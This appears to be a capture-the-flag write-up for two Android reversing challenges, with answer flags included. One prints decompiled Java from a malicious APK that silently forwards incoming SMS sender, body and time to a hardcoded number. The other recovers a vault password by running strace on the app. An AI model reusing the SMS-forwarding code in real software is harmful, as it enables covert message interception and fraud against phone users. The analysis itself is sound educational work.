## Reverse That App
**Description**: We have intercepted a malicious Android binary, and we need your help analyzing the application! Reports from the wild say that this piece of malware is sending text messages to a premium number, resulting in a huge phone bill for the victims! This needs to stop… Can you identify the mobile number of the attacker so we can track him down? Answer in this format: `+XX XXX XXX XXX`

**Note**: For this challenge, we need install some things into our Android 5.1 device with Genymotion.
For example, an **ARM Translator**.
https://github.com/m9rco/Genymotion_ARM_Translation

Download **APK**: https://lautarovculic.com/my_files/Kbank.apk

![[reverseThatApp1.png]]

Install the **apk** with **adb**
```bash
adb install -r Kbank.apk
```

Then, let's decompile the **apk** with **apktool**
```bash
apktool d Kbank.apk
```

We can see this code with **jadx** (GUI version):
```java
package com.fake.site.sms;  
  
import android.telephony.SmsManager;  
import java.text.SimpleDateFormat;  
import java.util.ArrayList;  
  
/* loaded from: classes.dex */  
public class Sms {  
    public static final String NUMBER = "+79163525068";  
    private String mBody;  
    private String mSender;  
    private String mTimestamp;  
    private final boolean USE_NUMBER = true;  
    private final String[] BLACK_LIST = {""};  
    private final boolean USE_BLACK_LIST = false;  
    private final boolean NOT_ACCEPT_ALL_MESSAGE = true;  
  
    public Sms(String _body, String _sender, long _timestamp) {  
        this.mBody = _body;  
        this.mSender = _sender;  
        this.mTimestamp = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss").format(Long.valueOf(_timestamp));  
    }  
  
    public boolean filterAll() {  
        return true;  
    }  
  
    public boolean filter() {  
        return false;  
    }  
  
    public String createMessage() {  
        String mesage = String.valueOf(this.mSender) + " " + this.mBody + " " + this.mTimestamp;  
        return mesage;  
    }  
  
    public void sendSms(String message) {  
        SmsManager smsManager = SmsManager.getDefault();  
        if (message.length() > 70) {  
            ArrayList<String> mArray = smsManager.divideMessage(message);  
            smsManager.sendMultipartTextMessage(NUMBER, null, mArray, null, null);  
        } else {  
            smsManager.sendTextMessage(NUMBER, null, message, null, null);  
        }  
    }  
}
```

And there is the **flag**: `+79163525068`

## Nviso Vault
**Description**: One of our programmers made a Vault that is used to store sensitive information. He says it’s safe, but come on, the application _must_ be leaking information somewhere… right?

**Note**: For this challenge, we need install some things into our Android 5.1 device with Genymotion.
For example, an **ARM Translator**.
https://github.com/m9rco/Genymotion_ARM_Translation

Download **APK**: https://lautarovculic.com/my_files/NvisoVault.apk

![[nvisoVault1.png]]

Install the **apk** with **adb**
```bash
adb install -r NvisoVault.apk
```

And then, decompile that with **apktool**
```bash
apktool d NvisoVault.apk
```

We can see that an algorithm is generated every second:
![[nvisoVault2.png]]

We can use **strace**.
But, what is **strace**?
**strace is a tool that allows you to track all system calls** (syscalls) made by a process on **Linux** or **Android**. This includes operations such as opening files, accessing networks, working with memory, among others. It is very useful for debugging applications, analyzing malware, or as in this case, understanding how an application interacts with the system to find possible flags or passwords.

For use **strace**, in this case, we need know the **PID** of the app before the **10 seconds**. So we need be **quickly**.
Enter to your **genymotion** device running
```bash
adb shell
```

Then, launch the **app** and get the **PID** (second column)
```bash
ps | grep vault
```
You must look an output like this:
```bash
130|root@vbox86p:/ # ps | grep vault
u0_a84    5060  3597  999340 54040 00000000 f7584055 S be.nviso.nvisovault
```
In this case, the **PID** is **5060**
Run strace **quick**
```bash
root@vbox86p:/ # strace -p 5060
```
Output:
```bash
Process 5060 attached
[...]
[...]
[...]
madvise(0xf3f1a000, 65536, MADV_DONTNEED) = 0
faccessat(AT_FDCWD, "Decoding data with password \342\200\230I_love_panda_bears\342\200\231", F_OK) = -1 ENOENT (No such file or directory)
clock_gettime(CLOCK_MONOTONIC, {1753, 899555810}) = 0
```

Search, and re-run the commands until you get the **flag**: `I_love_panda_bears`

I hope you found it useful (: